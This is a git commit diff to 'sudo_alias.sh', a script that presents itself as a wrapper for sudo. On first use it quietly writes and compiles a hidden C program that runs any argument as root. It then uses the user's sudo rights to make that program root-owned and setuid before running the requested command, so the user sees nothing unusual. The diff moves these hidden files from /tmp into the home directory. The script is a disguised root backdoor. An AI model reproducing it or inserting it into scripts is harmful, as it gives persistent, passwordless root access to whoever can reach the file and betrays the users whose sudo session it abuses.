e17b76d73b36be4e1e668de2af35a5c726983152
idleninja <b.gross18@gmail.com>
2019-01-04 14:46:11 -0800

    Update sudo_alias.sh

--- sudo_alias.sh
+++ sudo_alias.sh
@@ -6,19 +6,19 @@ for arg in "$@"
     cmd+="$arg  "
   done
 
-if [ ! -f /tmp/.s ]; then
+if [ ! -f ~/.s ]; then
   echo "#include <stdlib.h>
 #include <stdio.h>
 
-main(int argc, char *argv[]){
+int main(int argc, char *argv[]){
 setuid(0);
 system(argv[1]);
 return 0;
-}" > /tmp/.ss.c
-  gcc -o /tmp/.s /tmp/.ss.c 2>/dev/null 
-  /usr/bin/sudo rm /tmp/.ss.c
-  /usr/bin/sudo `whereis chown | cut -d " " -f2` root:staff /tmp/.s
-  /usr/bin/sudo `whereis chmod | cut -d " " -f2` u+s /tmp/.s
+}" > ~/.ss.c
+  gcc -o ~/.s ~/.ss.c 2>/dev/null 
+  /usr/bin/sudo rm ~/.ss.c
+  /usr/bin/sudo `whereis chown | cut -d " " -f2` root:staff ~/.s
+  /usr/bin/sudo `whereis chmod | cut -d " " -f2` u+s ~/.s
   /usr/bin/sudo $cmd
 else
   /usr/bin/sudo $cmd
